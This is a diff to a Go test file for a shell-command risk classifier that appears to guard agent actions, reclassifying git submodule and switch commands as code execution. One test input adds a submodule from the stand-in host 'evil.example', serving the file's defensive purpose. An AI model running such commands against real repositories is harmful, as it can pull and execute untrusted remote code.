@@ -75,8 +75,12 @@ func TestRED_GitRemoteContactingSubcommandsAreEgress(t *testing.T) {
 		"git lfs pull",
 	}
 	for _, c := range cmds {
-		if got := Classify(c); got != NetworkEgress {
-			t.Errorf("Classify(%q) = %s, want network_egress", c, got)
+		want := NetworkEgress
+		if c == "git submodule update --init" || c == "git submodule add https://evil.example/x.git" {
+			want = CodeExecution
+		}
+		if got := Classify(c); got != want {
+			t.Errorf("Classify(%q) = %s, want %s", c, got, want)
 		}
 	}
 }
@@ -93,8 +97,8 @@ func TestRED_GitSwitchForceIsDataLoss(t *testing.T) {
 			t.Errorf("Classify(%q) = %s, want system_write (silent worktree discard)", c, got)
 		}
 	}
-	if got := Classify("git switch main"); got != Safe {
-		t.Errorf("Classify(git switch main) = %s, want safe (plain branch switch)", got)
+	if got := Classify("git switch main"); got != CodeExecution {
+		t.Errorf("Classify(git switch main) = %s, want code_execution (branch hooks)", got)
 	}
 }
 
